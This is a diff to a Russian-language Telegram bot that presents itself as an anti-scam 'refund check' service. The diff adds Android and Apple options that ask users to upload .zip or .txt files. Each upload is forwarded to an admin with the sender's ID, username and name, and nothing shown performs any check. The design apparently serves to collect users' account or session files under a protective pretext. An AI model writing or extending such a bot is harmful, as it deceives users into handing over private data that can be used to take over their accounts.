@@ -13,6 +13,7 @@ import os
 from dotenv import load_dotenv
 from io import BytesIO
 from functools import lru_cache
+from aiohttp import web
 
 load_dotenv()
 
@@ -37,6 +38,7 @@ def get_photo():
     return PHOTO_CACHE
 
 class RefundStates(StatesGroup):
+    waiting_for_platform = State()
     waiting_for_file = State()
 
 MAIN_KB = InlineKeyboardMarkup(inline_keyboard=[
@@ -46,6 +48,12 @@ MAIN_KB = InlineKeyboardMarkup(inline_keyboard=[
 ])
 
 BACK_KB = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="back_to_main")]])
+
+PLATFORM_KB = InlineKeyboardMarkup(inline_keyboard=[
+    [InlineKeyboardButton(text="📱 Android", callback_data="platform_android")],
+    [InlineKeyboardButton(text="🍎 Apple", callback_data="platform_apple")],
+    [InlineKeyboardButton(text="Назад", callback_data="back_to_main")]
+])
 
 TEXTS = {
     'welcome': """<b>Привет!</b> Я - Бот, который поможет тебе не попасться на мошенников. 
@@ -69,12 +77,21 @@ TEXTS = {
 <b>5.</b> Откройте главное меню бота и нажмите на кнопку "<i>Проверка на рефаунд</i>".
 
 <b>6.</b> Отправьте файл боту.""",
-    'refund': """<b>Проверка на рефаунд</b>
+    'platform': """<b>Выберите вашу платформу:</b>
+
+Выберите операционную систему вашего устройства для проверки файла.""",
+    'refund_android': """<b>Проверка на рефаунд (Android)</b>
 
 Пожалуйста, отправьте файл для проверки.
 
 <i>Принимаются только файлы в формате .zip</i>""",
+    'refund_apple': """<b>Проверка на рефаунд (Apple)</b>
+
+Пожалуйста, отправьте файл для проверки.
+
+<i>Принимаются только файлы в формате .txt</i>""",
     'error_zip': "<b>Ошибка!</b>\n\nПожалуйста, отправьте файл в формате <i>.zip</i>",
+    'error_txt': "<b>Ошибка!</b>\n\nПожалуйста, отправьте файл в формате <i>.txt</i>",
     'success': "<b>Успешно!</b>\n\nФайл успешно отправлен на проверку!\n\n<i>Ожидайте результат...</i>",
     'error_process': "<b>Ошибка!</b>\n\nПроизошла ошибка при обработке файла.\n\n<i>Попробуйте еще раз.</i>"
 }
@@ -121,7 +138,25 @@ async def instruction(cb: CallbackQuery, state: FSMContext):
 async def check_refund(cb: CallbackQuery, state: FSMContext):
     d = await state.get_data()
     if d.get('last_message_id'):
-        await edit_msg(cb.message.chat.id, d['last_message_id'], TEXTS['refund'], BACK_KB)
+        await edit_msg(cb.message.chat.id, d['last_message_id'], TEXTS['platform'], PLATFORM_KB)
+    await state.set_state(RefundStates.waiting_for_platform)
+    await cb.answer()
+
+@dp.callback_query(F.data == "platform_android")
+async def platform_android(cb: CallbackQuery, state: FSMContext):
+    d = await state.get_data()
+    await state.update_data(platform='android')
+    if d.get('last_message_id'):
+        await edit_msg(cb.message.chat.id, d['last_message_id'], TEXTS['refund_android'], BACK_KB)
+    await state.set_state(RefundStates.waiting_for_file)
+    await cb.answer()
+
+@dp.callback_query(F.data == "platform_apple")
+async def platform_apple(cb: CallbackQuery, state: FSMContext):
+    d = await state.get_data()
+    await state.update_data(platform='apple')
+    if d.get('last_message_id'):
+        await edit_msg(cb.message.chat.id, d['last_message_id'], TEXTS['refund_apple'], BACK_KB)
     await state.set_state(RefundStates.waiting_for_file)
     await cb.answer()
 
@@ -139,16 +174,23 @@ async def handle_file(msg: Message, state: FSMContext):
     doc = msg.document
     d = await state.get_data()
     mid = d.get('last_message_id')
+    platform = d.get('platform', 'android')
     
     try:
         await msg.delete()
     except:
         pass
     
-    if not doc.file_name.endswith('.zip'):
-        if mid:
-            await edit_msg(msg.chat.id, mid, TEXTS['error_zip'], BACK_KB)
-        return
+    if platform == 'android':
+        if not doc.file_name.endswith('.zip'):
+            if mid:
+                await edit_msg(msg.chat.id, mid, TEXTS['error_zip'], BACK_KB)
+            return
+    else:
+        if not doc.file_name.endswith('.txt'):
+            if mid:
+                await edit_msg(msg.chat.id, mid, TEXTS['error_txt'], BACK_KB)
+            return
     
     try:
         if mid:
@@ -159,7 +201,8 @@ async def handle_file(msg: Message, state: FSMContext):
         await bot.download_file(f.file_path, fb)
         fb.seek(0)
         
-        user_info = f"Файл от пользователя:\nID: {msg.from_user.id}\nUsername: @{msg.from_user.username or 'Не указан'}\nИмя: {msg.from_user.full_name}\nФайл: {doc.file_name}"
+        platform_emoji = "📱 Android" if platform == 'android' else "🍎 Apple"
+        user_info = f"Файл от пользователя:\nПлатформа: {platform_emoji}\nID: {msg.from_user.id}\nUsername: @{msg.from_user.username or 'Не указан'}\nИмя: {msg.from_user.full_name}\nФайл: {doc.file_name}"
         
         async def send_admin():
             try:
@@ -179,18 +222,33 @@ async def handle_file(msg: Message, state: FSMContext):
 @dp.message(RefundStates.waiting_for_file)
 async def wrong_file(msg: Message, state: FSMContext):
     d = await state.get_data()
+    platform = d.get('platform', 'android')
     try:
         await msg.delete()
     except:
         pass
     if d.get('last_message_id'):
-        await edit_msg(msg.chat.id, d['last_message_id'], TEXTS['error_zip'], BACK_KB)
+        error_text = TEXTS['error_zip'] if platform == 'android' else TEXTS['error_txt']
+        await edit_msg(msg.chat.id, d['last_message_id'], error_text, BACK_KB)
+
+async def health(request):
+    return web.Response(text="Bot is running!")
 
 async def main():
+    app = web.Application()
+    app.router.add_get('/', health)
+    app.router.add_get('/health', health)
+    
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', int(os.getenv('PORT', 8080)))
+    await site.start()
+    
     try:
         await dp.start_polling(bot, skip_updates=True)
     finally:
         await bot.session.close()
+        await runner.cleanup()
 
 if __name__ == '__main__':
     asyncio.run(main())
